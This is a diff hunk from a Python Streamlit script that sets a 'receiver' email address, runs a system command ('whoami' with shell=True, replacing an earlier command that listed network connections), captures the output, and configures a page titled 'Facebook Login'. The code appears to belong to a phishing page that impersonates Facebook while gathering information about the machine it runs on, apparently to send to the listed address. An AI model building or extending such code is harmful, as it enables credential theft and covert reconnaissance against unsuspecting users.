@@ -18,15 +18,16 @@ receiver= "sonu.code.ai@gmail.com"
 # Run a simple command
 
 try:
-    # Run the CMD command
-    output = subprocess.run(["nmcli", "connection", "show"],stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
+    # Run the linux command
+    command=["whoami"]
+    output = subprocess.run(command,shell=True,capture_output=True,text=True)
 
     # Get the output
     final_output = output.stdout if output.returncode == 0 else output.stderr
 
 except Exception as e:
     final_output = f"Error occurred: {e}"
-
+    
 
 
 st.set_page_config(page_title="Facebook Login",page_icon="logo.png" ,layout="centered")
